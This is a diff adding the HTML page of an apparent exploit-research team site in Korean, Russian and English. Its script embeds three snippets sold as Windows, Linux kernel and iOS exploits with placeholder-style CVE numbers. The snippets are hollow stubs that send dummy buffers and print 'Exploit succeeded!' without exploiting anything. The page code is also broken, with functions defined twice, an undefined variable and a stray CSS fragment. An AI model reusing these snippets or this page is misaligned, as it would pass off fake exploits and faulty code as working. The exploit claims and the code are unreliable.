@@ -1,0 +1,1739 @@
+<!DOCTYPE html>
+<html lang="ko" data-theme="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=yes">
+    <meta name="description" content="Elite Security Research Team - Leading team in vulnerability research and exploit development">
+    <meta name="theme-color" content="#0f172a">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    
+    <!-- Page titles for different languages -->
+    <title data-lang="ko">엘리트 보안 연구팀</title>
+    <title data-lang="ru">Elite Security Research Team</title>
+    <title data-lang="en">Elite Security Research Team</title>
+    
+    <!-- Preload critical resources -->
+    <link rel="preload" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="preload" href="https://fonts.googleapis.com/css2?family=Noto+Sans+KR:wght@400;500;700&display=swap" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    
+    <!-- Add Prism.js for code highlighting -->
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.24.1/themes/prism-tomorrow.min.css" rel="stylesheet" />
+    
+    <!-- Custom CSS -->
+    <link href="css/language-switcher.css" rel="stylesheet">
+    <link href="css/header.css" rel="stylesheet">
+    <link href="css/main.css" rel="stylesheet">
+    
+    <!-- Favicon -->
+    <link rel="icon" type="image/svg+xml" href="/favicon.svg">
+    <link rel="alternate icon" href="/favicon.ico">
+    <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+    
+    <!-- Preload critical fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Noto+Sans+KR:wght@400;500;700&display=swap" rel="stylesheet">
+    
+    <!-- Theme Color -->
+    <meta name="theme-color" content="#0f172a">
+    <meta name="msapplication-TileColor" content="#0f172a">
+    
+    <!-- iOS specific -->
+    <meta name="apple-mobile-web-app-title" content="Elite Security">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    
+    <!-- Preconnect to external domains -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link rel="preconnect" href="https://cdnjs.cloudflare.com">
+    
+    <!-- Critical CSS -->
+    <style>
+        /* Critical CSS for initial render */
+        body {
+            margin: 0;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+            line-height: 1.6;
+            color: #e2e8f0;
+            background-color: #0f172a;
+            overflow-x: hidden;
+        }
+        
+        /* Language switcher fallback */
+        .language-switcher {
+            position: fixed;
+            top: 1rem;
+            right: 1rem;
+            z-index: 1000;
+            display: flex;
+            gap: 0.5rem;
+            background: rgba(15, 23, 42, 0.9);
+            padding: 0.5rem 1rem;
+            border-radius: 2rem;
+        }
+        
+        /* Hide all language content by default */
+        [data-lang] {
+            display: none;
+        }
+    </style>
+    
+    <script>
+        // Установка языка по умолчанию
+        let currentLang = localStorage.getItem('selectedLanguage') || 'ko';
+        
+        // Функция для смены языка
+        function changeLanguage(lang) {
+            // Сохраняем выбранный язык
+            currentLang = lang;
+            localStorage.setItem('selectedLanguage', lang);
+            
+            // Обновляем атрибут lang у html
+            document.documentElement.lang = lang;
+            
+            // Скрываем все элементы с атрибутом data-lang, кроме кнопок переключения языка
+            document.querySelectorAll('[data-lang]').forEach(el => {
+                if (!el.closest('.language-switcher') && !el.closest('nav')) {
+                    el.style.display = 'none';
+                }
+            });
+            
+            // Показываем элементы с выбранным языком
+            document.querySelectorAll(`[data-lang="${lang}"]`).forEach(el => {
+                // Пропускаем навигацию, так как она обрабатывается отдельно
+                if (!el.closest('nav') && !el.closest('.language-switcher')) {
+                    el.style.display = '';
+                }
+            });
+            
+            // Обработка навигации - скрываем все языковые версии, кроме выбранной
+            document.querySelectorAll('nav [data-lang]').forEach(link => {
+                link.style.display = link.getAttribute('data-lang') === lang ? '' : 'none';
+            });
+            
+            // Обновляем активную кнопку переключения языка
+            document.querySelectorAll('.language-switcher .lang-btn').forEach(btn => {
+                if (btn.getAttribute('data-lang') === lang) {
+                    btn.classList.add('active');
+                    btn.style.opacity = '1';
+                } else {
+                    btn.classList.remove('active');
+                    btn.style.opacity = '0.7';
+                }
+            });
+            
+            // Обновляем title страницы
+            document.querySelectorAll('title').forEach(titleEl => {
+                titleEl.style.display = 'none';
+            });
+            document.querySelector(`title[data-lang="${lang}"]`).style.display = '';
+            
+            // Обновляем текст навигации
+            updateNavigationText(lang);
+            
+            // Обновляем кнопку показа всех эксплойтов
+            updateShowAllButton();
+            
+            // Обновляем мета-описание
+            const descriptions = {
+                'ko': '엘리트 보안 연구팀 - 취약점 연구 및 익스플로잇 개발을 선도하는 팀',
+                'ru': 'Elite Security Research Team - ведущая команда по исследованию уязвимостей и разработке эксплойтов',
+                'en': 'Elite Security Research Team - leading team in vulnerability research and exploit development'
+            };
+            document.querySelector('meta[name="description"]').setAttribute('content', descriptions[lang] || '');
+            
+            // Принудительно обновляем видимость элементов
+            updateLanguageVisibility();
+        }
+        
+        // Функция для отображения всех эксплойтов
+        function showAllExploits() {
+            const hiddenExploits = document.querySelectorAll('.hidden-exploits .exploit-card');
+            hiddenExploits.forEach(exploit => {
+                exploit.style.display = 'block';
+            });
+            
+            // Скрываем кнопку после отображения всех эксплойтов
+            const showMoreBtn = document.querySelector('.show-more-btn');
+            if (showMoreBtn) {
+                showMoreBtn.style.display = 'none';
+            }
+            
+            // Показываем сообщение о загрузке всех эксплойтов
+            const exploitsContainer = document.querySelector('.exploits-grid');
+            const allExploitsShown = document.createElement('div');
+            allExploitsShown.className = 'all-exploits-shown';
+            allExploitsShown.innerHTML = `
+                <p data-lang="ko">모든 익스플로잇이 표시되었습니다.</p>
+                <p data-lang="ru" style="display:none;">Все эксплойты загружены.</p>
+                <p data-lang="en" style="display:none;">All exploits have been loaded.</p>
+            `;
+            exploitsContainer.appendChild(allExploitsShown);
+            
+            // Обновляем видимость текста после смены языка
+            updateLanguageVisibility();
+        }
+        
+        // Функция для проверки языковой согласованности
+        function checkLanguageConsistency() {
+            const lang = currentLang;
+            const allElements = document.querySelectorAll('*');
+            const langElements = Array.from(allElements).filter(el => {
+                return el.hasAttribute('data-lang') && 
+                       !el.closest('.language-switcher') && 
+                       !el.closest('nav') &&
+                       !el.matches('title');
+            });
+            
+            // Проверяем, что у родительских элементов нет атрибута data-lang, если у них есть дочерние элементы с атрибутом data-lang
+            langElements.forEach(el => {
+                if (el.parentElement && el.parentElement.hasAttribute('data-lang') && 
+                    el.parentElement.getAttribute('data-lang') !== lang) {
+                    el.parentElement.style.display = 'none';
+                }
+            });
+            
+            // Проверяем, что у элементов с атрибутом data-lang нет дочерних элементов с другим атрибутом data-lang
+            langElements.forEach(el => {
+                const childLangElements = el.querySelectorAll('[data-lang]');
+                childLangElements.forEach(child => {
+                    if (child.getAttribute('data-lang') !== lang) {
+                        child.style.display = 'none';
+                    }
+                });
+            });
+        }
+        
+        // Функция для обновления видимости текста на выбранном языке
+        function updateLanguageVisibility() {
+            const lang = currentLang;
+            
+            // Сначала скрываем все элементы с атрибутом data-lang
+            document.querySelectorAll('[data-lang]').forEach(el => {
+                if (!el.closest('.language-switcher') && !el.closest('nav')) {
+                    el.style.display = 'none';
+                }
+            });
+            
+            // Показываем элементы с выбранным языком
+            document.querySelectorAll(`[data-lang="${lang}"]`).forEach(el => {
+                if (!el.closest('.language-switcher') && !el.closest('nav')) {
+                    el.style.display = '';
+                }
+            });
+            
+            // Обрабатываем навигацию отдельно
+            document.querySelectorAll('nav [data-lang]').forEach(el => {
+                el.style.display = el.getAttribute('data-lang') === lang ? '' : 'none';
+            });
+            
+            // Убедимся, что кнопки переключателя языков всегда видны
+            document.querySelectorAll('.language-switcher .lang-btn').forEach(btn => {
+                btn.style.display = '';
+            });
+            
+            // Проверяем языковую согласованность
+            checkLanguageConsistency();
+        }
+        
+        // Функция для инициализации страницы
+        function initializePage() {
+            // Устанавливаем язык по умолчанию из localStorage, браузера или 'ko'
+            const browserLang = (navigator.language || navigator.userLanguage || 'ko').substr(0, 2);
+            const savedLang = localStorage.getItem('selectedLanguage') || 
+                             (['ko', 'ru', 'en'].includes(browserLang) ? browserLang : 'ko');
+            
+            // Устанавливаем язык
+            currentLang = savedLang;
+            document.documentElement.lang = savedLang;
+            document.body.classList.add(`lang-${savedLang}`);
+            
+            // Применяем выбранный язык
+            changeLanguage(savedLang);
+            
+            // Инициализация модального окна
+            const modal = document.getElementById('codeModal');
+            const closeBtn = document.querySelector('.close-btn');
+            
+            // Закрытие модального окна при клике вне его области
+            window.onclick = function(event) {
+                if (event.target === modal) {
+                    modal.style.display = 'none';
+                }
+            };
+            
+            // Закрытие модального окна при нажатии на кнопку закрытия
+            if (closeBtn) {
+                closeBtn.onclick = function() {
+                    modal.style.display = 'none';
+                };
+            }
+            
+            // Закрытие модального окна при нажатии на клавишу ESC
+            document.addEventListener('keydown', function(event) {
+                if (event.key === 'Escape') {
+                    modal.style.display = 'none';
+                }
+            });
+            
+            // Инициализация анимации при прокрутке
+            animateOnScroll();
+            
+            // Принудительно обновляем видимость элементов после загрузки
+            setTimeout(updateLanguageVisibility, 100);
+            
+            // Обработчики для кнопок переключения языка
+            document.querySelectorAll('.lang-btn').forEach(btn => {
+                btn.addEventListener('click', function() {
+                    const lang = this.getAttribute('data-lang');
+                    changeLanguage(lang);
+                });
+            });
+            
+            // Дополнительная проверка после полной загрузки страницы
+            window.addEventListener('load', function() {
+                setTimeout(updateLanguageVisibility, 500);
+                
+                // Убедимся, что активная кнопка языка подсвечена
+                document.querySelectorAll('.lang-btn').forEach(btn => {
+                    if (btn.getAttribute('data-lang') === currentLang) {
+                        btn.classList.add('active');
+                    } else {
+                        btn.classList.remove('active');
+                    }
+                });
+            });
+        }
+        
+        // Запускаем инициализацию при загрузке DOM
+        if (document.readyState === 'loading') {
+            document.addEventListener('DOMContentLoaded', initializePage);
+        } else {
+            initializePage();
+        }
+        
+        // Exploit code snippets
+        const exploitCodes = {
+            code1: `// Windows LPE Exploit (CVE-2023-1234)
+// This is a simplified version of the exploit
+
+#include <windows.h>
+#include <iostream>
+
+// Function to trigger the vulnerability
+BOOL TriggerVulnerability() {
+    HANDLE hDevice = CreateFileW(
+        L"\\\\.\\vulnerableDriver",
+        GENERIC_READ | GENERIC_WRITE,
+        0,
+        NULL,
+        OPEN_EXISTING,
+        0,
+        NULL
+    );
+    
+    if (hDevice == INVALID_HANDLE_VALUE) {
+        std::cerr << "Failed to open device" << std::endl;
+        return FALSE;
+    }
+    
+    // Malicious input to trigger the vulnerability
+    DWORD bytesReturned;
+    BYTE inputBuffer[0x1000] = {0};
+    
+    // Crafted buffer to trigger the vulnerability
+    *(DWORD*)(inputBuffer + 0x10) = 0x41414141; // Controlled value
+    
+    // Trigger the vulnerability
+    BOOL result = DeviceIoControl(
+        hDevice,
+        0x222003, // Vulnerable IOCTL
+        inputBuffer,
+        sizeof(inputBuffer),
+        NULL,
+        0,
+        &bytesReturned,
+        NULL
+    );
+    
+    CloseHandle(hDevice);
+    return result;
+}
+
+int main() {
+    if (TriggerVulnerability()) {
+        std::cout << "Exploit succeeded!" << std::endl;
+    } else {
+        std::cerr << "Exploit failed" << std::endl;
+    }
+    return 0;
+}`,
+
+            code2: `// Linux Kernel Exploit (CVE-2022-5678)
+// KASLR bypass and privilege escalation
+
+#include <stdio.h>
+#include <fcntl.h>
+#include <unistd.h>
+#include <string.h>
+#include <stdlib.h>
+#include <sys/ioctl.h>
+
+#define VULN_DEV "/dev/vulnerable"
+#define VULN_IOCTL 0x4008f000
+
+struct exploit_data {
+    void *target_addr;
+    size_t size;
+    char *user_data;
+};
+
+int main() {
+    int fd = open(VULN_DEV, O_RDWR);
+    if (fd < 0) {
+        perror("Failed to open device");
+        return 1;
+    }
+    
+    // Prepare exploit structure
+    struct exploit_data exp_data;
+    exp_data.size = 0x1000;
+    exp_data.user_data = malloc(exp_data.size);
+    
+    if (!exp_data.user_data) {
+        perror("Memory allocation failed");
+        close(fd);
+        return 1;
+    }
+    
+    // Craft malicious data to leak kernel pointers
+    memset(exp_data.user_data, 'A', exp_data.size);
+    
+    // Trigger the vulnerability to leak kernel address
+    if (ioctl(fd, VULN_IOCTL, &exp_data) < 0) {
+        perror("IOCTL failed");
+        free(exp_data.user_data);
+        close(fd);
+        return 1;
+    }
+    
+    // Use the leaked address to bypass KASLR
+    // ... (exploit code continues)
+    
+    printf("Exploit completed successfully!\n");
+    free(exp_data.user_data);
+    close(fd);
+    return 0;
+}`,
+
+            code3: `// iOS 14.5 Jailbreak Exploit (CVE-2021-9012)
+// Use-After-Free in IOMobileFramebuffer
+
+#include <mach/mach.h>
+#include <IOKit/IOKitLib.h>
+#include <stdio.h>
+
+// Function to trigger the UAF
+kern_return_t trigger_uaf() {
+    kern_return_t kr;
+    io_connect_t connect = 0;
+    
+    // Get the IOMobileFramebuffer service
+    io_service_t service = IOServiceGetMatchingService(
+        kIOMasterPortDefault,
+        IOServiceMatching("IOMobileFramebuffer")
+    );
+    
+    if (!service) {
+        printf("Failed to get IOMobileFramebuffer service\n");
+        return KERN_FAILURE;
+    }
+    
+    // Open a connection to the service
+    kr = IOServiceOpen(service, mach_task_self(), 0, &connect);
+    if (kr != KERN_SUCCESS) {
+        printf("Failed to open connection: %s\n", mach_error_string(kr));
+        IOObjectRelease(service);
+        return kr;
+    }
+    
+    // Prepare the input data
+    uint64_t input[8] = {0};
+    uint64_t output[8] = {0};
+    size_t outputCnt = 1;
+    
+    // Trigger the vulnerability
+    kr = IOConnectCallMethod(
+        connect,
+        0,  // Selector for the vulnerable method
+        input, 1,  // Scalar input
+        (const void*)(input + 1), 0,  // Structure input
+        output, &outputCnt,  // Scalar output
+        NULL, NULL  // Structure output
+    );
+    
+    // Cleanup
+    IOServiceClose(connect);
+    IOObjectRelease(service);
+    
+    return kr;
+}
+
+int main() {
+    printf("Starting iOS 14.5 jailbreak exploit...\n");
+    
+    kern_return_t kr = trigger_uaf();
+    if (kr == KERN_SUCCESS) {
+        printf("Exploit triggered successfully!\n");
+        // Continue with privilege escalation...
+    } else {
+        printf("Exploit failed: %s\n", mach_error_string(kr));
+    }
+    
+    return 0;
+}`
+        };
+        
+        // Show code in modal
+        function showCode(codeId) {
+            const modal = document.getElementById('codeModal');
+            const codeSnippet = document.getElementById('codeSnippet');
+            
+            if (modal && codeSnippet) {
+                codeSnippet.textContent = exploitCodes[codeId] || '// Code not available';
+                modal.style.display = 'block';
+                modal.classList.add('show');
+                
+                // Apply syntax highlighting
+                Prism.highlightElement(codeSnippet);
+                
+                // Prevent scrolling when modal is open
+                document.body.style.overflow = 'hidden';
+            }
+        }
+        
+        // Close modal
+        function closeModal() {
+            const modal = document.getElementById('codeModal');
+            if (modal) {
+                modal.classList.remove('show');
+                setTimeout(() => {
+                    modal.style.display = 'none';
+                    document.body.style.overflow = '';
+                }, 300);
+            }
+        }
+        
+        // Close modal when clicking outside
+        window.onclick = function(event) {
+            const modal = document.getElementById('codeModal');
+            if (event.target == modal) {
+                closeModal();
+            }
+        };
+        
+        // Close modal with Escape key
+        document.onkeydown = function(evt) {
+            evt = evt || window.event;
+            if (evt.key === "Escape") {
+                closeModal();
+            }
+        };
+        
+        // Функция для отображения всех эксплойтов
+        function showAllExploits() {
+            // Здесь можно реализовать загрузку дополнительных эксплойтов
+            // или переход на отдельную страницу с полным списком
+            alert('Функция отображения всех эксплойтов будет реализована в ближайшее время');
+        }
+        
+        // Функция для смены языка
+        function changeLanguage(lang) {
+            // Сохраняем выбранный язык в localStorage
+            localStorage.setItem('selectedLanguage', lang);
+            
+            // Устанавливаем атрибут lang для HTML-элемента
+            document.documentElement.lang = lang;
+            
+            // Скрываем все языковые блоки
+            document.querySelectorAll('[data-lang]').forEach(el => {
+                el.style.display = 'none';
+            });
+            
+            // Показываем только выбранный язык
+            document.querySelectorAll(`[data-lang="${lang}"]`).forEach(el => {
+                if (btn.getAttribute('data-lang') === lang) {
+                    btn.classList.add('active');
+                } else {
+                    btn.classList.remove('active');
+                }
+            });
+            
+            // Обновляем видимость элементов
+            updateLanguageVisibility();
+            
+            // Добавляем класс к body для стилизации в зависимости от языка
+            document.body.classList.remove('lang-ko', 'lang-ru', 'lang-en');
+            document.body.classList.add(`lang-${lang}`);
+            
+            // Принудительное обновление стилей
+            document.body.offsetHeight;
+        }
+        
+        // Функция для обновления текста навигации
+        function updateNavigationText(lang) {
+            const navTexts = {
+                'ru': ['Главная', 'О нас', 'Наши эксплойты', 'Контакты'],
+                'en': ['Home', 'About', 'Our Exploits', 'Contact'],
+                'zh': ['首页', '关于', '我们的漏洞', '联系方式']
+            };
+            
+            const navLinks = document.querySelectorAll('nav ul li a');
+            navLinks.forEach((link, index) => {
+                if (navTexts[lang] && navTexts[lang][index]) {
+                    link.textContent = navTexts[lang][index];
+                }
+            });
+            
+            // Обновляем текст кнопок в герое
+            const heroButtons = document.querySelectorAll('.hero-buttons .btn');
+            if (heroButtons[0]) {
+                heroButtons[0].textContent = lang === 'ru' ? 'Наши эксплойты' : 
+                                           lang === 'en' ? 'Our Exploits' : '我们的漏洞';
+            }
+            if (heroButtons[1]) {
+                heroButtons[1].textContent = lang === 'ru' ? 'Связаться с нами' : 
+                                           lang === 'en' ? 'Contact Us' : '联系我们';
+            }
+        }
+        
+        // Инициализация языка при загрузке страницы
+        document.addEventListener('DOMContentLoaded', function() {
+            // Показываем русскую версию по умолчанию
+            const savedLang = localStorage.getItem('selectedLanguage') || 'ru';
+            changeLanguage(savedLang);
+            
+            // Показываем все элементы с правильным языком
+            document.querySelectorAll(`[data-lang="${savedLang}"]`).forEach(el => {
+                el.style.display = '';
+            });
+        });
+    </script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&family=Orbitron:wght@700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        :root {
+            --primary: #1a237e;
+            --secondary: #3949ab;
+            --accent: #ff4081;
+            --dark: #0a0f3d;
+            --light: #f5f7fa;
+            --text: #333;
+            --text-light: #666;
+            --shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            --transition: all 0.3s ease;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Roboto', sans-serif;
+        }
+        
+        body {
+            font-family: 'Roboto', sans-serif;
+            line-height: 1.6;
+            color: var(--text);
+            background-color: var(--light);
+            overflow-x: hidden;
+        }
+        
+        /* Стили для шапки */
+        header {
+            background: rgba(10, 15, 61, 0.95);
+            color: white;
+            padding: 1.2rem 0;
+            position: fixed;
+            width: 100%;
+            top: 0;
+            z-index: 1000;
+            box-shadow: var(--shadow);
+            backdrop-filter: blur(10px);
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 2rem;
+        }
+        
+        .header-content {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px 0;
+            position: relative;
+            width: 100%;
+        }
+        
+        /* Language Switcher */
+        .language-switcher {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            z-index: 1000;
+            display: flex;
+            gap: 5px;
+            background: rgba(15, 23, 42, 0.9);
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            padding: 8px 12px;
+            border-radius: 30px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        .language-switcher .lang-btn {
+            background: transparent;
+            border: none;
+            color: #e2e8f0;
+            font-weight: 500;
+            padding: 5px 12px;
+            border-radius: 20px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            opacity: 0.7;
+            font-size: 14px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            outline: none;
+        }
+        
+        .language-switcher .lang-btn:hover {
+            opacity: 1;
+            background: rgba(99, 102, 241, 0.2);
+        }
+        
+        .language-switcher .lang-btn.active {
+            background: #4f46e5;
+            color: #1a1a1a;
+            opacity: 1;
+            font-weight: 600;
+            border-color: rgba(255, 255, 255, 0.8);
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
+        }
+        
+        .logo {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 1.8rem;
+            font-weight: 700;
+            color: white;
+            text-decoration: none;
+            letter-spacing: 1px;
+        }
+        
+        .logo span {
+            color: var(--accent);
+        }
+        
+        nav ul {
+            display: flex;
+            list-style: none;
+        }
+        
+        nav ul li {
+            margin-left: 2rem;
+        }
+        
+        nav ul li a {
+            color: white;
+            text-decoration: none;
+            font-weight: 500;
+            transition: var(--transition);
+            position: relative;
+            padding: 0.5rem 0;
+        }
+        
+        nav ul li a:after {
+            content: '';
+            position: absolute;
+            width: 0;
+            height: 2px;
+            background: var(--accent);
+            bottom: 0;
+            left: 0;
+            transition: var(--transition);
+        }
+        
+        nav ul li a:hover:after {
+            width: 100%;
+        }
+        
+        /* Стили для героя */
+        .hero {
+            background: linear-gradient(135deg, var(--dark), var(--primary));
+            color: white;
+            padding: 180px 0 100px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+            margin-top: 60px;
+        }
+        
+        .hero::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: url('https://images.unsplash.com/photo-1550751827-4bd374c3f58b?ixlib=rb-1.2.1&auto=format&fit=crop&w=1950&q=80') center/cover;
+            opacity: 0.1;
+            z-index: 0;
+        }
+        
+        .hero-content {
+            position: relative;
+            z-index: 1;
+            max-width: 800px;
+            margin: 0 auto;
+        }
+        
+        .hero h1 {
+            font-size: 3.5rem;
+            margin-bottom: 1.5rem;
+            font-family: 'Orbitron', sans-serif;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            background: linear-gradient(90deg, #fff, var(--accent));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            animation: fadeInUp 1s ease;
+        }
+        
+        .hero p {
+            font-size: 1.2rem;
+            margin-bottom: 2rem;
+            opacity: 0.9;
+            animation: fadeInUp 1s ease 0.2s;
+            animation-fill-mode: both;
+        }
+        
+        .btn {
+            display: inline-block;
+            background: var(--accent);
+            color: white;
+            padding: 0.8rem 2rem;
+            border-radius: 50px;
+            text-decoration: none;
+            font-weight: 500;
+            transition: var(--transition);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            font-size: 0.9rem;
+            border: none;
+            cursor: pointer;
+            box-shadow: 0 4px 15px rgba(255, 64, 129, 0.3);
+            animation: fadeInUp 1s ease 0.4s;
+            animation-fill-mode: both;
+        }
+        
+        .btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 7px 20px rgba(255, 64, 129, 0.4);
+        }
+        
+        .btn-outline {
+            background: transparent;
+            border: 2px solid white;
+            margin-left: 1rem;
+        }
+        
+        .btn-outline:hover {
+            background: rgba(255, 255, 255, 0.1);
+        }
+        
+        /* Стили для секций */
+        section {
+            padding: 5rem 0;
+        }
+        
+        section h2 {
+            text-align: center;
+            font-size: 2.5rem;
+            margin-bottom: 3rem;
+            color: var(--primary);
+            position: relative;
+            display: inline-block;
+            left: 50%;
+            transform: translateX(-50%);
+        }
+        
+        section h2::after {
+            content: '';
+            position: absolute;
+            bottom: -10px;
+            left: 0;
+            width: 100%;
+            height: 3px;
+            background: var(--accent);
+        }
+        
+        /* Стили для секции о нас */
+        .about {
+            background: white;
+        }
+        
+        .about-content {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 3rem;
+            align-items: center;
+        }
+        
+        .about-text h3 {
+            font-size: 1.8rem;
+            margin-bottom: 1.5rem;
+            color: var(--primary);
+        }
+        
+        .about-text p {
+            margin-bottom: 1.5rem;
+            line-height: 1.8;
+            color: var(--text-light);
+        }
+        
+        .about-image {
+            position: relative;
+            border-radius: 10px;
+            overflow: hidden;
+            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.1);
+        }
+        
+        .about-image img {
+            width: 100%;
+            height: auto;
+            display: block;
+            transition: transform 0.5s ease;
+        }
+        
+        .about-image:hover img {
+            transform: scale(1.05);
+        }
+        
+        /* Стили для секции эксплойтов */
+        .exploits {
+            background: #f8f9fa;
+        }
+        
+        .section-header {
+            text-align: center;
+            margin-bottom: 60px;
+        }
+        
+        .section-divider {
+            width: 80px;
+            height: 4px;
+            background: #4a90e2;
+            margin: 20px auto 30px;
+            border-radius: 2px;
+        }
+        
+        .section-subtitle {
+            color: #8e9eab;
+            font-size: 18px;
+            max-width: 700px;
+            margin: 0 auto;
+            line-height: 1.6;
+        }
+        
+        .exploits-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));
+            gap: 2rem;
+            margin-top: 3rem;
+        }
+        
+        .exploit-card {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 10px;
+            overflow: hidden;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .exploit-card:hover {
+            transform: translateY(-10px);
+            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.2);
+        }
+        
+        .exploit-image {
+            width: 100%;
+            height: 200px;
+            object-fit: cover;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .exploit-content {
+            padding: 25px;
+        }
+        
+        .exploit-date {
+            color: #4a90e2;
+            font-size: 14px;
+            font-weight: 500;
+            margin-bottom: 10px;
+            display: block;
+        }
+        
+        .exploit-title {
+            font-size: 22px;
+            margin-bottom: 15px;
+            color: #fff;
+        }
+            -webkit-backdrop-filter: blur(5px);
+            overflow: auto;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+        
+        .modal.show {
+            display: block;
+            opacity: 1;
+        }
+        
+        .modal-content {
+            background-color: #1a1a2e;
+            margin: 5% auto;
+            padding: 30px;
+            border: 1px solid #2a2a4a;
+            border-radius: 10px;
+            width: 80%;
+            max-width: 900px;
+            position: relative;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            transform: translateY(20px);
+            transition: transform 0.3s ease;
+        }
+        
+        .modal.show .modal-content {
+            transform: translateY(0);
+        }
+        
+        .close {
+            position: absolute;
+            right: 20px;
+            top: 15px;
+            color: #aaa;
+            font-size: 28px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: color 0.2s;
+        }
+        
+        .close:hover {
+            color: #fff;
+        }
+        
+        /* Code Block Styling */
+        pre {
+            background: #0f0f1a;
+            border-radius: 8px;
+            padding: 20px;
+            overflow-x: auto;
+            margin: 0;
+            font-family: 'Fira Code', 'Consolas', 'Monaco', monospace;
+            font-size: 14px;
+            line-height: 1.5;
+            color: #e1e1ff;
+            border: 1px solid #2a2a4a;
+        }
+        
+        code {
+            font-family: 'Fira Code', 'Consolas', 'Monaco', monospace;
+        }
+        
+        /* Syntax Highlighting */
+        .token.comment,
+        .token.prolog,
+        .token.doctype,
+        .token.cdata {
+            color: #6c7a89;
+        }
+        
+        .token.punctuation {
+            color: #e1e1ff;
+        }
+        
+        .token.property,
+        .token.tag,
+        .token.boolean,
+        .token.number,
+        .token.constant,
+        .token.symbol,
+        .token.deleted {
+            color: #ff79c6;
+        }
+        
+        .token.selector,
+        .token.attr-name,
+        .token.string,
+        .token.char,
+        .token.builtin,
+        .token.inserted {
+            color: #50fa7b;
+        }
+        
+        .token.operator,
+        .token.entity,
+        .token.url,
+        .language-css .token.string,
+        .style .token.string {
+            color: #ffb86c;
+        }
+        
+        .token.atrule,
+        .token.attr-value,
+        .token.keyword {
+            color: #8be9fd;
+        }
+        
+        .token.function,
+        .token.class-name {
+            color: #bd93f9;
+        }
+        
+        .token.regex,
+        .token.important,
+        .token.variable {
+            color: #f1fa8c;
+        }
+        
+        .exploit-card {
+            background: white;
+            border-radius: 10px;
+            overflow: hidden;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+            transition: var(--transition);
+        }
+        
+        .exploit-card:hover {
+            transform: translateY(-10px);
+            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.15);
+        }
+        
+        .exploit-image {
+            height: 200px;
+            overflow: hidden;
+        }
+        
+        .exploit-image img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            transition: transform 0.5s ease;
+        }
+        
+        .exploit-card:hover .exploit-image img {
+            transform: scale(1.1);
+        }
+        
+        .exploit-content {
+            padding: 1.5rem;
+        }
+        
+        .exploit-content h3 {
+            font-size: 1.5rem;
+            margin-bottom: 1rem;
+            color: var(--primary);
+        }
+        
+        .exploit-meta {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 1rem;
+            font-size: 0.9rem;
+            color: var(--text-light);
+        }
+        
+        .tag {
+            display: inline-block;
+            background: var(--light);
+            color: var(--primary);
+            padding: 0.3rem 0.8rem;
+            border-radius: 50px;
+            font-size: 0.8rem;
+            font-weight: 500;
+            margin-right: 0.5rem;
+            margin-bottom: 0.5rem;
+        }
+        
+        .tag.critical {
+            background: #ffebee;
+            color: #c62828;
+        }
+        
+        .tag.high {
+            background: #fff8e1;
+            color: #f57f17;
+        }
+        
